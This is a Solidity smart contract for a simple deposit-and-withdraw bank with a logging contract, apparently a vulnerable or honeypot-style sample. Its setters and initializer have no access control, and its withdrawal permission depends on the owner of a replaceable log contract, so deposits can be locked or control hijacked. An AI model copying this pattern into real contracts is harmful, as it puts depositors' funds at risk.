pragma solidity ^0.4.19;

contract PERSONAL_BANK {
    mapping(address => uint256) public balances;
    mapping(address => bool) public isAllowedToWithdraw;
    uint public MinSum = 1 ether;
    LogFile Log = new LogFile();

    bool initialized;

    function setMinSum(uint _val) public {
        require(!initialized);
        MinSum = _val;
    }

    function setLogFile(address _log) public {
        require(!initialized);
        Log = LogFile(_log);
    }

    function initialize() public {
        initialized = true;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }

    function allowWithdrawal(address _address) public {
        require(msg.sender == Log.owner());
        isAllowedToWithdraw[_address] = true;
    }

    function disallowWithdrawal(address _address) public {
        require(msg.sender == Log.owner());
        isAllowedToWithdraw[_address] = false;
    }

    function collect(uint _am) public {
        require(isAllowedToWithdraw[msg.sender]);
        require(balances[msg.sender] >= MinSum);
        require(balances[msg.sender] >= _am);

        balances[msg.sender] -= _am;
        Log.addMessage(msg.sender, _am, "Collect");

        msg.sender.transfer(_am);
    }

    function() public payable {
        deposit();
    }
}

contract LogFile {
    address public owner;

    struct Message {
        address sender;
        string data;
        uint val;
        uint time;
    }

    Message[] public history;

    function LogFile() public {
        owner = msg.sender;
    }

    function addMessage(address _adr, uint _val, string _data) public {
        require(msg.sender == owner);

        Message memory message = Message({
            sender: _adr,
            time: now,
            val: _val,
            data: _data
        });

        history.push(message);
    }
}